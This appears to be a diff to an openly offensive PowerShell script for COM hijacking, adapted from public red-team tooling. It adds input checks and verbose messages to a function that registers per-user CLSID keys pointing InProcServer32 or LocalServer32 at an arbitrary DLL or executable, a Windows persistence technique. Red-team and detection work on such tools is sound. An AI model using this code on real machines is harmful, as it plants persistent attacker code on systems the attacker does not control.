@@ -1,10 +1,9 @@
-# references:
+# references and credits:
 # https://pentestlab.blog/2020/05/20/persistence-com-hijacking/
 #   List of lots of different techniques
 # good explanation of missing libraries use https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
+# https://github.com/nccgroup/acCOMplice/blob/master/COMHijackToolkit/COMHijackToolkit.ps1
 
-# Source : https://github.com/nccgroup/acCOMplice/blob/master/COMHijackToolkit/COMHijackToolkit.ps1
-# TODO: build this out to deal with HKLM and HKCU as well
 function Get-RegistrySubkeys {
     $HKCR_CLSID = "Registry::HKCR\CLSID"
     # grabs all of the HKCR CLSIDs
@@ -148,24 +147,22 @@ function Missing-Libraries {
 
 function Create-COM-Object($GUID, $binary, $CLSID_name) {
     if (!($GUID)) {
-        return "GUID must be provided"
+        return "`nERROR: GUID must be provided`n"
     }
     if (!($binary)) {
-        return "binary must be provided"
+        return "`nERROR: binary must be provided`n"
     }
-        
-    #check if the binary for the target of the GUID exists
+    if (!(Test-Path -Path "$binary")) {
+        return "`nERROR: `"$binary`" does not exist - check the path`n"
+    }
+
     if (!($GUID.contains("{"))) {
         $GUID = "{" + $GUID
     }
     if (!($GUID.contains("}"))) {
         $GUID = $GUID + "}"
     }
-    if (!(Test-Path -Path "$binary")) {
-        return "`"$binary`" does not exist - check the path"
-    }
 
-    # check the extension of the binary
     $dll = $False
     $exe = $False
     if ($binary.contains(".exe")) {
@@ -175,33 +172,40 @@ function Create-COM-Object($GUID, $binary, $CLSID_name) {
         $dll = $True
     }
     else {
-        return "target binary must be either a dll or executable" 
+        return "`nERROR: target binary must be either a dll or executable`n" 
     }
 
     # check for the existence of the HKLM COM Object
+    "Checking for the existence of Registry::HKCU\Software\Classes\CLSID\$GUID"
     $HKCU_obj = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$GUID" -ErrorAction SilentlyContinue
     if ($HKCU_obj) {
-        return "$GUID already exists in HKLM. Try a different GUID"
+        return "`nERROR: $GUID already exists in HKLM. Try a different GUID`n"
     }
 
     #Create a new COM Object
+    "Creating Registry::HKCU\Software\Classes\CLSID\$GUID"
     New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "$GUID" | Out-Null
     if ($CLSID_name) {
+        "Setting CLSID 'default' value of Registry::HKCU\Software\Classes\CLSID\$GUID to $CLSID_name"
         Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name '(default)' -Value "$CLSID_name" | Out-Null
     }
     if ($dll) {
         # create the inprocserver32 subkey
+        "Creating HKCU:\Software\Classes\CLSID\$GUID\InProcServer32"
         New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "InProcServer32" | Out-Null
+        "Setting CLSID 'default' value of HKCU:\Software\Classes\CLSID\$GUID\InProcServer32 to $binary"
         Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32" -Name '(default)' -Value "$binary" | Out-Null
         return "HKCU:\Software\Classes\CLSID\$GUID\InProcServer32 set to $binary"
     } 
     elseif ($exe) {
         # create the inprocserver32 subkey
+        "Creating HKCU:\Software\Classes\CLSID\$GUID\LocalServer32"
         New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "LocalServer32" | Out-Null
+        "Setting CLSID 'default' value of HKCU:\Software\Classes\CLSID\$GUID\LocalServer32 to $binary"
         Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32" -Name '(default)' -Value "$binary" | Out-Null
         return "HKCU:\Software\Classes\CLSID\$GUID\LocalServer32 set to $binary"
     } else {
-        "Something went wrong"
+        return "`nERROR: Something went wrong`n"
     }
 }
 
